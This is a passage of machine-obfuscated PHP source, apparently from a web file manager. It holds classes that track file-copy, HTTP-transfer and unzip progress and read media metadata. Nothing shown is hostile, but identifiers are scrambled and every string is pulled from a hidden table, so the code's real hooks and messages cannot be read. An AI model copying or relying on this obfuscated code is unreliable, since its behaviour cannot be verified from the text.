$B™‰õ¶–¼ˆ[1441])); goto cŸèù Á¾; a·¼´™–Áº: $B™‰õ¶–¼ˆ =& $_SERVER[»„]; $D‰Ë‹½°âÒ =& $this->task; $this->sourceCopyFolder = !1; goto f¾±ä•¤Ò«; eˆ¾Àã÷ôŞ: Hook::bind($B™‰õ¶–¼ˆ[1446], array($this, $B™‰õ¶–¼ˆ[1447])); Hook::bind($B™‰õ¶–¼ˆ[1448], array($this, $B™‰õ¶–¼ˆ[1449])); Hook::bind($B™‰õ¶–¼ˆ[1450], array($this, $B™‰õ¶–¼ˆ[1451])); goto fºİ˜à Àè; F¢¦çµ®¾„: } protected function endAfter() { goto féˆ‹ĞŞã; dçŞ·‘†íÉ: Hook::unbind($Fíêˆˆ¤»®[511], array($this, $Fíêˆˆ¤»®[1442])); Hook::unbind($Fíêˆˆ¤»®[1443], array($this, $Fíêˆˆ¤»®[1444])); Hook::unbind($Fíêˆˆ¤»®[528], array($this, $Fíêˆˆ¤»®[1445])); goto CÏ¤¤”ôùØ; CÏ¤¤”ôùØ: Hook::unbind($Fíêˆˆ¤»®[1446], array($this, $Fíêˆˆ¤»®[1447])); Hook::unbind($Fíêˆˆ¤»®[1448], array($this, $Fíêˆˆ¤»®[1449])); Hook::unbind($Fíêˆˆ¤»®[1450], array($this, $Fíêˆˆ¤»®[1451])); goto b¼ÔÔ«“¦Ä; féˆ‹ĞŞã: $Fíêˆˆ¤»® =& $_SERVER[»„]; Hook::unbind($Fíêˆˆ¤»®[1433], array($this, $Fíêˆˆ¤»®[1434])); Hook::unbind($Fíêˆˆ¤»®[1435], array($this, $Fíêˆˆ¤»®[1436])); goto F¯½ƒÓò¨; F¯½ƒÓò¨: Hook::unbind($Fíêˆˆ¤»®[1437], array($this, $Fíêˆˆ¤»®[1438])); Hook::unbind($Fíêˆˆ¤»®[535], array($this, $Fíêˆˆ¤»®[1439])); Hook::unbind($Fíêˆˆ¤»®[536], array($this, $Fíêˆˆ¤»®[1440])); goto B¡ˆËÀÚ“; B¡ˆËÀÚ“: Hook::unbind($Fíêˆˆ¤»®[538], array($this, $Fíêˆˆ¤»®[1441])); Hook::unbind($Fíêˆˆ¤»®[539], array($this, $Fíêˆˆ¤»®[1441])); Hook::unbind($Fíêˆˆ¤»®[505], array($this, $Fíêˆˆ¤»®[1442])); goto D—çˆè³Ñ; D—çˆè³Ñ: Hook::unbind($Fíêˆˆ¤»®[502], array($this, $Fíêˆˆ¤»®[1442])); Hook::unbind($Fíêˆˆ¤»®[507], array($this, $Fíêˆˆ¤»®[1442])); Hook::unbind($Fíêˆˆ¤»®[509], array($this, $Fíêˆˆ¤»®[1442])); goto dçŞ·‘†íÉ; b¼ÔÔ«“¦Ä: } public function copyMoveStart($bí¸©Ä ­¿, $d‚Ü°‡Ÿ‡, $Fõ¸¿Æ³Ê«, $CÀù‡¤Íº) { } public function updateAfter() { goto c·ïï×Ü®¿; a”Ïñ˜½²: if ($this->sourceModelCopyFlag) { return; } $E¼‰èêàÔ‹ = 0; if ($b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1456]] == $f£Ñ‡¼£Ä[1028]) { $E¼‰èêàÔ‹ = $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1455]] * 0.5; } else { if ($b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1456]] == $f£Ñ‡¼£Ä[102]) { $E¼‰èêàÔ‹ = $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1455]] * 0.5 + $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1454]] * 0.5; } } goto e÷ˆŠ†“„; c·ïï×Ü®¿: $f£Ñ‡¼£Ä =& $_SERVER[»„]; $b¿Â ‘¯£¦ =& $this->task; if (!$b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[686]]) { return; } goto a”Ïñ˜½²; e÷ˆŠ†“„: $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1410]] = ($b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1459]] + $E¼‰èêàÔ‹) / $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[686]]; if ($b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1410]] > 0) { $a´‡¸±Í“Š = timeFloat() - $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1412]] - $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1415]]; $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1416]] = $a´‡¸±Í“Š * (1 - $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1410]]) / $b¿Â ‘¯£¦[$f£Ñ‡¼£Ä[1410]]; } goto D±¨ùˆ¸®Œ; D±¨ùˆ¸®Œ: } public function addPath($b¤ÌÔ‡ñÔï) { goto Aƒë½ëÚ¨¶; EÆöö„¬Ô: $A‹çëÙ¥’­ = IO::infoWithChildren($b¤ÌÔ‡ñÔï); $b„ÁŞ‰ìŞ° = $c‘ñ²Êê[$DŸĞƒ·ÊÛ[1460]] ? $c‘ñ²Êê[$DŸĞƒ·ÊÛ[1460]][$DŸĞƒ·ÊÛ[1461]] : 0; $c‘ñ²Êê[$DŸĞƒ·ÊÛ[1460]] = array($DŸĞƒ·ÊÛ[1461] => $b„ÁŞ‰ìŞ° + 1, $DŸĞƒ·ÊÛ[382] => $A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[28]], $DŸĞƒ·ÊÛ[75] => $A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[75]], $DŸĞƒ·ÊÛ[462] => $A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[462]] ? $A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[462]] : $A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[75]]); goto Aƒ´Šç³¸; Aƒ´Šç³¸: if ($A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[29]] == $DŸĞƒ·ÊÛ[163]) { $c‘ñ²Êê[$DŸĞƒ·ÊÛ[966]] += 1; } else { $c‘ñ²Êê[$DŸĞƒ·ÊÛ[966]] += $A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[80]][$DŸĞƒ·ÊÛ[78]]; if ($A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[365]]) { $c‘ñ²Êê[$DŸĞƒ·ÊÛ[966]] += $A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[80]][$DŸĞƒ·ÊÛ[79]] + 1; } } $c‘ñ²Êê[$DŸĞƒ·ÊÛ[686]] += $A‹çëÙ¥’­[$DŸĞƒ·ÊÛ[77]]; $this->update(); goto Eï»Ó´ë¤ê; Aƒë½ëÚ¨¶: $DŸĞƒ·ÊÛ =& $_SERVER[»„]; if (!$b¤ÌÔ‡ñÔï) { return; } $c‘ñ²Êê =& $this->task; goto EÆöö„¬Ô; Eï»Ó´ë¤ê: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Cß†ÏÖ’åÒ) { $Eçì®‰ªŒ¦ =& $_SERVER[»„]; $C¸£Ëõøß =& $this->task; $C¸£Ëõøß[$Eçì®‰ªŒ¦[1452]] = $Cß†ÏÖ’åÒ[$Eçì®‰ªŒ¦[28]]; $C¸£Ëõøß[$Eçì®‰ªŒ¦[968]] = $Cß†ÏÖ’åÒ[$Eçì®‰ªŒ¦[28]]; $this->update(); } public function copyFileStart($Dò¥…Ÿ˜ÍÚ, $f®¨Êè…”Á, $f¯ÙåÂ·œ‡, $D©ùÜÑÑÉ—, $fÔÓÅ—Ë— , $b®¼ÍŞõì) { goto Cöˆï½ĞËâ; AÇ§¸¥öÜ«: $Eî‹°õÈø®[$D¯ƒàÄ¹ô[1452]] = $B¥ªÇÇá; $Eî‹°õÈø®[$D¯ƒàÄ¹ô[1454]] = (int) $Dò¥…Ÿ˜ÍÚ->size($f®¨Êè…”Á); $Eî‹°õÈø®[$D¯ƒàÄ¹ô[1455]] = 0; goto cäá•İê¶¯; c­¯Æ˜‚: $this->update(); goto eÂ°¸™¨®ò; cäá•İê¶¯: $Eî‹°õÈø®[$D¯ƒàÄ¹ô[968]] = $D¯ƒàÄ¹ô[33]; $Eî‹°õÈø®[$D¯ƒàÄ¹ô[1456]] = $D¯ƒàÄ¹ô[33]; $Eî‹°õÈø®[$D¯ƒàÄ¹ô[1457]] = 0; goto c­¯Æ˜‚; f¡îÕ·Ğ‚é: $GLOBALS[$D¯ƒàÄ¹ô[1463]] = $fÔÓÅ—Ë— ; $GLOBALS[$D¯ƒàÄ¹ô[1462]] = $b®¼ÍŞõì; $Eî‹°õÈø® =& $this->task; goto AÇ§¸¥öÜ«; Cöˆï½ĞËâ: $D¯ƒàÄ¹ô =& $_SERVER[»„]; $B¥ªÇÇá = $fÔÓÅ—Ë— ; if ($B¥ªÇÇá == $GLOBALS[$D¯ƒàÄ¹ô[1462]]) { $B¥ªÇÇá = $GLOBALS[$D¯ƒàÄ¹ô[1463]]; } goto f¡îÕ·Ğ‚é; eÂ°¸™¨®ò: } public function copyFileEnd($d‘Û‚½Œğ, $Cáíæ‰Î±Ó, $EÇ•ã™×¨, $a±†…éçË—, $b¯Ø”à¨Ëˆ, $eµ¤÷®Ö—ç) { $B¿Ú¹—¦í¾ =& $_SERVER[»„]; $D—´„ÑÄ–º =& $this->task; $D—´„ÑÄ–º[$B¿Ú¹—¦í¾[1455]] = $D—´„ÑÄ–º[$B¿Ú¹—¦í¾[1454]]; $D—´„ÑÄ–º[$B¿Ú¹—¦í¾[1456]] = $B¿Ú¹—¦í¾[33]; if ($b¯Ø”à¨Ëˆ == $D—´„ÑÄ–º[$B¿Ú¹—¦í¾[1452]]) { $D—´„ÑÄ–º[$B¿Ú¹—¦í¾[1459]] += $D—´„ÑÄ–º[$B¿Ú¹—¦í¾[1454]]; $this->update(1); } else { $this->update(); $D—´„ÑÄ–º[$B¿Ú¹—¦í¾[1455]] = 0; } self::log($B¿Ú¹—¦í¾[1464] . $Cáíæ‰Î±Ó . $B¿Ú¹—¦í¾[66] . $a±†…éçË— . $B¿Ú¹—¦í¾[213] . $b¯Ø”à¨Ëˆ . $B¿Ú¹—¦í¾[1465] . $D—´„ÑÄ–º[$B¿Ú¹—¦í¾[1452]]); } public function updateFileEnd($b·¢Ñ¼‰—›, $fĞÍô«²©Ï) { $cŒœ¹„‘„‚ =& $_SERVER[»„]; $EõÈÛøÈº =& $this->task; $EõÈÛøÈº[$cŒœ¹„‘„‚[1452]] = $b·¢Ñ¼‰—›; $EõÈÛøÈº[$cŒœ¹„‘„‚[1454]] = $fĞÍô«²©Ï; $EõÈÛøÈº[$cŒœ¹„‘„‚[1459]] += $fĞÍô«²©Ï; $this->update(1); } public function sourceModelCopy($aô–‚±ÆÄ) { goto a…ß¦ÉèÁ; a…ß¦ÉèÁ: $fæøµ”Õ =& $_SERVER[»„]; $A©–ğï©Í¤ = $aô–‚±ÆÄ[0]; $dˆµõÃ¨Áù = $aô–‚±ÆÄ[1]; goto fˆ÷Ûù²Ë; A ¯‘£ÜÛ: switch ($A©–ğï©Í¤) { case $fæøµ”Õ[503]: $E™š±«–Ã = 1; break; case $fæøµ”Õ[506]: $DŒ›ô‡àå[$fæøµ”Õ[1452]] = $dˆµõÃ¨Áù[$fæøµ”Õ[28]]; break; case $fæøµ”Õ[508]: $E™š±«–Ã = intval($aô–‚±ÆÄ[$fæøµ”Õ[359]] * 0.4); break; case $fæøµ”Õ[510]: $E™š±«–Ã = intval($aô–‚±ÆÄ[$fæøµ”Õ[359]] * 0.2); break; case $fæøµ”Õ[512]: $E™š±«–Ã = intval($aô–‚±ÆÄ[$fæøµ”Õ[359]] * 0.4); break; } $this->update($E™š±«–Ã); $this->sourceModelCopyFlag = !1; goto E›‚–Àƒ×ß; fˆ÷Ûù²Ë: $DŒ›ô‡àå =& $this->task; $this->sourceModelCopyFlag = !0; $E™š±«–Ã = 0; goto A ¯‘£ÜÛ; E›‚–Àƒ×ß: } public function sourceRemove($c×Ô‘‹âÖÜ, $fîÚÊ»ÃÑí) { $fÉá›˜œâ² =& $_SERVER[»„]; $this->sourceModelCopyFlag = !0; $fïƒŒ´åß‡ = 1; if (isset($c×Ô‘‹âÖÜ[$fÉá›˜œâ²[80]])) { $fïƒŒ´åß‡ = $c×Ô‘‹âÖÜ[$fÉá›˜œâ²[80]][$fÉá›˜œâ²[78]] + $c×Ô‘‹âÖÜ[$fÉá›˜œâ²[80]][$fÉá›˜œâ²[79]] + 1; } $this->update($fïƒŒ´åß‡); $this->sourceModelCopyFlag = !1; } public function sourceMove($F»¯¥¥í‘Œ) { $this->sourceRemove($F»¯¥¥í‘Œ, !1); } public function curlProgress($dêôŠ®ÅÄŞ, $cé–¸ï‘Æ, $dèã«®“„, $C‘£ä³©Ÿ·, $a…¾ùêğƒŒ) { $e•¿õªĞèØ =& $_SERVER[»„]; $aĞÁ›…‡Ğ  =& $this->task; if ($a…¾ùêğƒŒ > 0) { $aĞÁ›…‡Ğ [$e•¿õªĞèØ[968]] = $e•¿õªĞèØ[1466]; $aĞÁ›…‡Ğ [$e•¿õªĞèØ[1456]] = $e•¿õªĞèØ[102]; if ($aĞÁ›…‡Ğ [$e•¿õªĞèØ[1454]] == $C‘£ä³©Ÿ· || $C‘£ä³©Ÿ· > 1024 * 1024) { $aĞÁ›…‡Ğ [$e•¿õªĞèØ[1455]] = $a…¾ùêğƒŒ; } if ($aĞÁ›…‡Ğ [$e•¿õªĞèØ[1457]]) { $aĞÁ›…‡Ğ [$e•¿õªĞèØ[1455]] = $a…¾ùêğƒŒ + $aĞÁ›…‡Ğ [$e•¿õªĞèØ[1457]]; } } else { if ($dèã«®“„ > 0) { if ($aĞÁ›…‡Ğ [$e•¿õªĞèØ[1454]] == $cé–¸ï‘Æ) { $aĞÁ›…‡Ğ [$e•¿õªĞèØ[1455]] = $dèã«®“„; $aĞÁ›…‡Ğ [$e•¿õªĞèØ[968]] = $e•¿õªĞèØ[1467]; $aĞÁ›…‡Ğ [$e•¿õªĞèØ[1456]] = $e•¿õªĞèØ[1028]; } } } $this->update(); } public function curlProgressStart($F§ë½Ò¹ŒÉ) { } public function curlProgressEnd($bÈÊ–ˆòƒ) { $DÕÑÌ‘‡Ï =& $_SERVER[»„]; $F¡îƒ¯çÅª =& $this->task; $f‡ºÄìùÁ = curl_getinfo($bÈÊ–ˆòƒ); $AÍó²Â§Üˆ = $f‡ºÄìùÁ[$DÕÑÌ‘‡Ï[1468]]; if ($F¡îƒ¯çÅª[$DÕÑÌ‘‡Ï[1456]] == $DÕÑÌ‘‡Ï[102] && $AÍó²Â§Üˆ) { $F¡îƒ¯çÅª[$DÕÑÌ‘‡Ï[1457]] += $AÍó²Â§Üˆ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $FÛ¶Ê¤–„ƒ =& $_SERVER[»„]; Hook::bind($FÛ¶Ê¤–„ƒ[1446], array($this, $FÛ¶Ê¤–„ƒ[1469])); Hook::bind($FÛ¶Ê¤–„ƒ[1448], array($this, $FÛ¶Ê¤–„ƒ[1470])); Hook::bind($FÛ¶Ê¤–„ƒ[1450], array($this, $FÛ¶Ê¤–„ƒ[1471])); } protected function endAfter() { $b‰åº—ç­Ç =& $_SERVER[»„]; Hook::unbind($b‰åº—ç­Ç[1446], array($this, $b‰åº—ç­Ç[1469])); Hook::unbind($b‰åº—ç­Ç[1448], array($this, $b‰åº—ç­Ç[1470])); Hook::unbind($b‰åº—ç­Ç[1450], array($this, $b‰åº—ç­Ç[1471])); } public function progressStart($FÀ‘Ñ¦Æ¦®) { $aæ„š¯¡®ö =& $_SERVER[»„]; $Fˆ‹âÉØ¤ = curl_getinfo($FÀ‘Ñ¦Æ¦®); self::log($aæ„š¯¡®ö[1472] . $Fˆ‹âÉØ¤[$aæ„š¯¡®ö[291]]); self::valueSet($this->task[$aæ„š¯¡®ö[363]], $this->task); } public function progressEnd($Cˆ¿×«ºÅ¸) { $E»ÍªÏ¼åŒ =& $_SERVER[»„]; self::log($E»ÍªÏ¼åŒ[1473] . $this->task[$E»ÍªÏ¼åŒ[363]]); $this->end(); } public function progress($c¹ñ’›Â‰§, $Fìí‘æö¯», $d”Éí ¸†…, $fÅº°ÀôÁ‚, $F•´¾©ÄŞ¹) { $f‘åˆÙ¦·Ï =& $_SERVER[»„]; $eÙŠ©÷¦µ =& $this->task; if ($F•´¾©ÄŞ¹ > 0) { $eÙŠ©÷¦µ[$f‘åˆÙ¦·Ï[966]] = $eÙŠ©÷¦µ[$f‘åˆÙ¦·Ï[966]] == 0 ? $fÅº°ÀôÁ‚ : $eÙŠ©÷¦µ[$f‘åˆÙ¦·Ï[966]]; $eÙŠ©÷¦µ[$f‘åˆÙ¦·Ï[978]] = $F•´¾©ÄŞ¹; } else { if ($d”Éí ¸†… > 0) { $eÙŠ©÷¦µ[$f‘åˆÙ¦·Ï[966]] = $eÙŠ©÷¦µ[$f‘åˆÙ¦·Ï[966]] == 0 ? $Fìí‘æö¯» : $eÙŠ©÷¦µ[$f‘åˆÙ¦·Ï[966]]; $eÙŠ©÷¦µ[$f‘åˆÙ¦·Ï[978]] = $d”Éí ¸†…; } } $this->update(); self::log("\x70\162\157\x67\162\145\163\163\x48\x74\164\x70\x3a\x64\157\x77\156\72{$d”Éí ¸†…}\57{$Fìí‘æö¯»}\x3b\40\165\x70\154\x6f\141\144\x3a{$F•´¾©ÄŞ¹}\x2f{$fÅº°ÀôÁ‚}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto fö¶Æ››¡; fö¶Æ››¡: $c¶Œ²§êÕì =& $_SERVER[»„]; parent::startAfter(); Hook::bind($c¶Œ²§êÕì[1474], array($this, $c¶Œ²§êÕì[1475])); goto FÒ½ˆñô¾¯; F­ğåğçò: if (!$f³Ô³‡Ó½Ì[$c¶Œ²§êÕì[1316]]) { $f³Ô³‡Ó½Ì[$c¶Œ²§êÕì[1316]] = LNG($c¶Œ²§êÕì[1478]); } goto BÓ½ÑÇŠ™—; FÒ½ˆñô¾¯: Hook::bind($c¶Œ²§êÕì[1023], array($this, $c¶Œ²§êÕì[1476])); $f³Ô³‡Ó½Ì =& $this->task; $f³Ô³‡Ó½Ì[$c¶Œ²§êÕì[1477]] = $c¶Œ²§êÕì[1028]; goto F­ğåğçò; BÓ½ÑÇŠ™—: } protected function endAfter() { $E„·ÅØÔö =& $_SERVER[»„]; parent::endAfter(); Hook::unbind($E„·ÅØÔö[1474], array($this, $E„·ÅØÔö[1475])); Hook::unbind($E„·ÅØÔö[1023], array($this, $E„·ÅØÔö[1476])); } public function updateAfter() { $b©’äø‹›¤ =& $_SERVER[»„]; $B³é³…ÜÇ =& $this->task; if (!$B³é³…ÜÇ[$b©’äø‹›¤[966]] || !$B³é³…ÜÇ[$b©’äø‹›¤[686]]) { return; } if ($B³é³…ÜÇ[$b©’äø‹›¤[1477]] == $b©’äø‹›¤[1028]) { $A’ÕßÂ˜Ì = 0; if ($B³é³…ÜÇ[$b©’äø‹›¤[1454]]) { $A’ÕßÂ˜Ì = $B³é³…ÜÇ[$b©’äø‹›¤[1455]] / $B³é³…ÜÇ[$b©’äø‹›¤[1454]]; } $B³é³…ÜÇ[$b©’äø‹›¤[1410]] = $A’ÕßÂ˜Ì * 0.3; } else { if ($B³é³…ÜÇ[$b©’äø‹›¤[1477]] == $b©’äø‹›¤[297]) { $A’ÕßÂ˜Ì = $B³é³…ÜÇ[$b©’äø‹›¤[978]] / $B³é³…ÜÇ[$b©’äø‹›¤[966]]; $B³é³…ÜÇ[$b©’äø‹›¤[1410]] = 0.3 + $A’ÕßÂ˜Ì * 0.4; } else { if ($B³é³…ÜÇ[$b©’äø‹›¤[1477]] == $b©’äø‹›¤[102]) { $b¤‡‹‚†¢ = 0; if ($B³é³…ÜÇ[$b©’äø‹›¤[1456]] == $b©’äø‹›¤[102]) { $b¤‡‹‚†¢ = $B³é³…ÜÇ[$b©’äø‹›¤[1455]]; } $A’ÕßÂ˜Ì = ($B³é³…ÜÇ[$b©’äø‹›¤[1459]] + $b¤‡‹‚†¢) / $B³é³…ÜÇ[$b©’äø‹›¤[686]]; $B³é³…ÜÇ[$b©’äø‹›¤[1410]] = 0.3 + 0.4 + $A’ÕßÂ˜Ì * 0.3; } } } if ($B³é³…ÜÇ[$b©’äø‹›¤[1410]] > 0) { $EÏ‰…½ÔÌÁ = timeFloat() - $B³é³…ÜÇ[$b©’äø‹›¤[1412]] - $B³é³…ÜÇ[$b©’äø‹›¤[1415]]; $B³é³…ÜÇ[$b©’äø‹›¤[1416]] = $EÏ‰…½ÔÌÁ * (1 - $B³é³…ÜÇ[$b©’äø‹›¤[1410]]) / $B³é³…ÜÇ[$b©’äø‹›¤[1410]]; } } public function addFile($fŸ¼ ±Ü¢¬) { goto b÷…Ç‡Ãï¹; EóµÁÔáß†: $FÑÜ¿•¾¨¬[$Aç¾¥Œ·Ø[1452]] = $C†¾ø×¶¾ [$Aç¾¥Œ·Ø[28]]; $FÑÜ¿•¾¨¬[$Aç¾¥Œ·Ø[1454]] = $C†¾ø×¶¾ [$Aç¾¥Œ·Ø[77]]; $FÑÜ¿•¾¨¬[$Aç¾¥Œ·Ø[1455]] = 0; goto DŠ‹²Šà…´; Có­ñ§©: $this->update(); goto Dï­î³Öğ ; D›ô–¥âÀÎ: $FÑÜ¿•¾¨¬[$Aç¾¥Œ·Ø[966]] = 1; $d‰ô÷èæ = 0; $FÑÜ¿•¾¨¬[$Aç¾¥Œ·Ø[1460]] = array($Aç¾¥Œ·Ø[1461] => $d‰ô÷èæ + 1, $Aç¾¥Œ·Ø[382] => $C†¾ø×¶¾ [$Aç¾¥Œ·Ø[28]], $Aç¾¥Œ·Ø[75] => $C†¾ø×¶¾ [$Aç¾¥Œ·Ø[75]], $Aç¾¥Œ·Ø[462] => $C†¾ø×¶¾ [$Aç¾¥Œ·Ø[462]] ? $C†¾ø×¶¾ [$Aç¾¥Œ·Ø[462]] : $C†¾ø×¶¾ [$Aç¾¥Œ·Ø[75]]); goto Có­ñ§©; DŠ‹²Šà…´: $FÑÜ¿•¾¨¬[$Aç¾¥Œ·Ø[968]] = $Aç¾¥Œ·Ø[1467]; $FÑÜ¿•¾¨¬[$Aç¾¥Œ·Ø[1456]] = $Aç¾¥Œ·Ø[1028]; $FÑÜ¿•¾¨¬[$Aç¾¥Œ·Ø[686]] = $C†¾ø×¶¾ [$Aç¾¥Œ·Ø[77]]; goto D›ô–¥âÀÎ; b÷…Ç‡Ãï¹: $Aç¾¥Œ·Ø =& $_SERVER[»„]; $FÑÜ¿•¾¨¬ =& $this->task; $C†¾ø×¶¾  = IO::info($fŸ¼ ±Ü¢¬); goto EóµÁÔáß†; Dï­î³Öğ : } public function unzipAfter($fâ–Ùò¼ÜŠ) { goto F¿­Éîª¥Ò; dà¨‘®ø‹ñ: $fİë¼¯—³ó[$BÛŠÊµÕ…½[1452]] = $BÛŠÊµÕ…½[33]; $fİë¼¯—³ó[$BÛŠÊµÕ…½[1459]] = 0; $fİë¼¯—³ó[$BÛŠÊµÕ…½[686]] = $bÄì¦Îèâë[$BÛŠÊµÕ…½[77]]; goto aÙä²ê©ß; A…Á”¯º£Û: $fİë¼¯—³ó[$BÛŠÊµÕ…½[978]] = 0; $fİë¼¯—³ó[$BÛŠÊµÕ…½[1454]] = 0; $fİë¼¯—³ó[$BÛŠÊµÕ…½[1455]] = 0; goto dà¨‘®ø‹ñ; CãñáƒÏçÌ: if ($bÄì¦Îèâë[$BÛŠÊµÕ…½[29]] == $BÛŠÊµÕ…½[163]) { $fİë¼¯—³ó[$BÛŠÊµÕ…½[966]] = 1; } else { $fİë¼¯—³ó[$BÛŠÊµÕ…½[966]] = $bÄì¦Îèâë[$BÛŠÊµÕ…½[80]][$BÛŠÊµÕ…½[78]]; } $fİë¼¯—³ó[$BÛŠÊµÕ…½[968]] = $BÛŠÊµÕ…½[33]; $fİë¼¯—³ó[$BÛŠÊµÕ…½[1456]] = 0; goto A…Á”¯º£Û; F¿­Éîª¥Ò: $BÛŠÊµÕ…½ =& $_SERVER[»„]; $fİë¼¯—³ó =& $this->task; $fİë¼¯—³ó[$BÛŠÊµÕ…½[1477]] = $BÛŠÊµÕ…½[102]; goto FŸöñ…æİô; aÙä²ê©ß: $this->update(); self::log($BÛŠÊµÕ…½[1479] . json_encode(array($fİë¼¯—³ó, $bÄì¦Îèâë))); goto cÀ¹¢ÛÎ™Ì; FŸöñ…æİô: $bÄì¦Îèâë = IO::infoWithChildren($fâ–Ùò¼ÜŠ); $A¥¾Í‚õ´¾ = 0; $fİë¼¯—³ó[$BÛŠÊµÕ…½[1460]] = array($BÛŠÊµÕ…½[1461] => $A¥¾Í‚õ´¾ + 1, $BÛŠÊµÕ…½[382] => $bÄì¦Îèâë[$BÛŠÊµÕ…½[28]], $BÛŠÊµÕ…½[75] => $bÄì¦Îèâë[$BÛŠÊµÕ…½[75]], $BÛŠÊµÕ…½[462] => $bÄì¦Îèâë[$BÛŠÊµÕ…½[462]] ? $bÄì¦Îèâë[$BÛŠÊµÕ…½[462]] : $bÄì¦Îèâë[$BÛŠÊµÕ…½[75]]); goto CãñáƒÏçÌ; cÀ¹¢ÛÎ™Ì: } public function nameParse($bŒÛŠÛá¡ë) { goto bŞÓ‘Ü­‚¥; bŞÓ‘Ü­‚¥: $Eì’ÈÇÁ¡ =& $_SERVER[»„]; $B•’Ä‚á =& $this->task; if ($B•’Ä‚á[$Eì’ÈÇÁ¡[1477]] == $Eì’ÈÇÁ¡[1028]) { $B•’Ä‚á[$Eì’ÈÇÁ¡[1477]] = $Eì’ÈÇÁ¡[297]; $B•’Ä‚á[$Eì’ÈÇÁ¡[1459]] = 0; $B•’Ä‚á[$Eì’ÈÇÁ¡[686]] = 0; } goto añĞ°®ÕÎ¼; dÑÙéñ¯£: $this->update(); goto aáÔ¯–ÇîŠ; añĞ°®ÕÎ¼: $eÜ•Ş‡ƒ¤Û = get_path_this($bŒÛŠÛá¡ë); if (strstr($eÜ•Ş‡ƒ¤Û, $Eì’ÈÇÁ¡[91])) { $B•’Ä‚á[$Eì’ÈÇÁ¡[978]] += 1; $B•’Ä‚á[$Eì’ÈÇÁ¡[966]] += 1; } $B•’Ä‚á[$Eì’ÈÇÁ¡[1452]] = $bŒÛŠÛá¡ë; goto dÑÙéñ¯£; aáÔ¯–ÇîŠ: } } goto Eˆ£ äÂš; EŸ ·Ï¤: class GetInfo { private static $fileTypeArray; public static function get($c­Ï¨‡Û›) { $E™µÔïÉ…Ä = IO::info($c­Ï¨‡Û›); return self::infoAdd($E™µÔïÉ…Ä); } public static function infoAdd(&$E™¼‡‹‹Æ) { goto eŒƒÑŒ÷´º; eŒƒÑŒ÷´º: $Bë‘¡Œ•Å =& $_SERVER[»„]; static $F¸¡À­‚í; if (!$F¸¡À­‚í) { require SDK_DIR . $Bë‘¡Œ•Å[1580]; $F¸¡À­‚í = new getID3(); } goto A Í¾¥©óñ; eÃ¨˜ÔÆ‡Á: $f«Ã­šÇÖõ[$Bë‘¡Œ•Å[368]] = $aÈ—Èëƒ—È; $E™¼‡‹‹Æ[$Bë‘¡Œ•Å[422]] = $f«Ã­šÇÖõ; return $E™¼‡‹‹Æ; goto cÅ¥äˆ²ƒˆ; BëÒÙ…·ß÷: $aÈ—Èëƒ—È = $E™¼‡‹‹Æ[$Bë‘¡Œ•Å[156]]; try { if ($E™¼‡‹‹Æ[$Bë‘¡Œ•Å[156]] == $Bë‘¡Œ•Å[1582]) { $f«Ã­šÇÖõ = self::psdParse($Fˆˆ˜ÛÛ ); $aÈ—Èëƒ—È = $Bë‘¡Œ•Å[1583]; } else { if ($E™¼‡‹‹Æ[$Bë‘¡Œ•Å[156]] == $Bë‘¡Œ•Å[1584]) { $f«Ã­šÇÖõ = self::pdfParse($Fˆˆ˜ÛÛ ); } else { $aÈ—Èëƒ—È = self::$fileTypeArray[$Bë‘¡Œ•Å[1585]][$E™¼‡‹‹Æ[$Bë‘¡Œ•Å[156]]]; $bµ³“ÀñĞæ = self::$fileTypeArray[$Bë‘¡Œ•Å[1586]][$aÈ—Èëƒ—È][$Bë‘¡Œ•Å[1587]]; $c¤¤Æ¤·Œ = @$F¸¡À­‚í->analyze($Fˆˆ˜ÛÛ , $E™¼‡‹‹Æ[$Bë‘¡Œ•Å[77]], $E™¼‡‹‹Æ[$Bë‘¡Œ•Å[28]]); $f«Ã­šÇÖõ = self::parseData($c¤¤Æ¤·Œ, $bµ³“ÀñĞæ, $E™¼‡‹‹Æ); } } } catch (Exception $aÆ§ªëØ®’) { $f«Ã­šÇÖõ = array($Bë‘¡Œ•Å[368] => $aÈ—Èëƒ—È); } if (!$f«Ã­šÇÖõ) { return; } goto eÃ¨˜ÔÆ‡Á; A Í¾¥©óñ: if (!$E™¼‡‹‹Æ || $E™¼‡‹‹Æ[$Bë‘¡Œ•Å[29]] != $Bë‘¡Œ•Å[163]) { return; } if (!self::support($E™¼‡‹‹Æ[$Bë‘¡Œ•Å[156]]) || isset($E™¼‡‹‹Æ[$Bë‘¡Œ•Å[422]])) { return; } $Fˆˆ˜ÛÛ  = $Bë‘¡Œ•Å[1581] . $E™¼‡‹‹Æ[$Bë‘¡Œ•Å[75]]; goto BëÒÙ…·ß÷; cÅ¥äˆ²ƒˆ: } public static function support($cÕ›¹ø”õ) { goto b³”…§•œš; b³”…§•œš: $A‰µÆ„ãÎ¹ =& $_SERVER[»„]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $cÕ›¹ø”õ = strtolower($cÕ›¹ø”õ); goto CÕãßŞê‘; Aµ‰„°Ÿ: return !1; goto cÁÎÏÆŠæ; CÕãßŞê‘: 